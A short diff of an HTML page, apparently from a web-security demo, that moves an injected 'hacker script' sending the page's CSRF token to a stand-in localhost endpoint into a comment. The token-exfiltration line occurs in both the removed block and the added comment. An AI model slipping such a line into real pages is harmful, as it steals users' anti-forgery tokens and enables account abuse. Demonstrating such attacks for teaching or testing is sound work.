@@ -48,6 +48,10 @@
             }
         });
     }
+    // hacker script injected via  XSS
+    // $.get("http://localhost:9999/stolenCsrf?"+xsrfToken);
+
+    $("#csrfTokenField").val(xsrfToken);
 </script>
 
 <br />
@@ -66,13 +70,6 @@
 
 </div>
 
-<script>
-
-    // hacker script
-    $.get("http://localhost:9999/stolenCsrf?"+xsrfToken);
-
-    $("#csrfTokenField").val(xsrfToken);
-</script>
 
 </body>
 </html>
